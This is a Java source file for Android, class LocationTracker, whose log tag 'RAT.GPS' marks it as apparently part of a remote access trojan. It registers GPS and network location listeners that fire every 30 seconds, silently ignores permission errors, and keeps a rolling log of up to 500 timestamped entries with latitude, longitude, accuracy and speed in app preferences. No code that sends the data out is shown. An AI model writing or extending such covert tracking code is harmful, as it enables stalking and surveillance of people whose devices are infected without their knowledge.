package com.nullx.pp;

import android.content.Context;
import android.content.SharedPreferences;
import android.location.Location;
import android.location.LocationListener;
import android.location.LocationManager;
import android.os.Bundle;
import android.util.Log;

import org.json.JSONArray;
import org.json.JSONObject;

import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.Locale;

public class LocationTracker {
    private static final String TAG = "RAT.GPS";

    public static void start(Context ctx) {
        try {
            LocationManager lm = (LocationManager) ctx.getSystemService(Context.LOCATION_SERVICE);
            if (lm == null) return;

            LocationListener listener = new LocationListener() {
                @Override
                public void onLocationChanged(Location location) {
                    saveLocation(ctx, location);
                }
                @Override public void onStatusChanged(String provider, int status, Bundle extras) {}
                @Override public void onProviderEnabled(String provider) {}
                @Override public void onProviderDisabled(String provider) {}
            };

            try {
                lm.requestLocationUpdates(LocationManager.GPS_PROVIDER, 30000, 10, listener);
            } catch (SecurityException ignored) {}
            try {
                lm.requestLocationUpdates(LocationManager.NETWORK_PROVIDER, 30000, 10, listener);
            } catch (SecurityException ignored) {}
        } catch (Exception e) {
            Log.e(TAG, "start error: " + e.getMessage());
        }
    }

    private static void saveLocation(Context ctx, Location loc) {
        try {
            SharedPreferences sp = ctx.getSharedPreferences("LocationPrefs", Context.MODE_PRIVATE);
            String existing = sp.getString("locations", "[]");
            JSONArray arr = new JSONArray(existing);
            JSONArray newArr = new JSONArray();
            int start = Math.max(0, arr.length() - 500);
            for (int i = start; i < arr.length(); i++) newArr.put(arr.get(i));

            JSONObject entry = new JSONObject();
            entry.put("lat", loc.getLatitude());
            entry.put("lng", loc.getLongitude());
            entry.put("acc", loc.getAccuracy());
            entry.put("speed", loc.getSpeed());
            entry.put("time", new SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.getDefault()).format(new Date()));
            newArr.put(entry);
            sp.edit().putString("locations", newArr.toString()).apply();

            Log.d(TAG, "Location: " + loc.getLatitude() + ", " + loc.getLongitude());
        } catch (Exception e) {
            Log.e(TAG, "save error: " + e.getMessage());
        }
    }
}